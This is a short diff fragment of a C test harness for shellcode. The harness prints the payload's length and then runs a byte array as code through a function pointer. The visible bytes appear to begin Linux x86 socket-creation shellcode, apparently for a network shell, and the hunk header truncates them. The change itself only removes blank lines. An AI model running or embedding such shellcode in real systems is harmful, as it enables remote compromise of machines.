@@ -6,8 +6,6 @@ unsigned char code[] = "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x06\x6a
 main()
 {
 	printf("Shellcode Length:  %d\n", strlen(code));
-
 	int (*ret)() = (int(*)())code;
-
 	ret();
 }
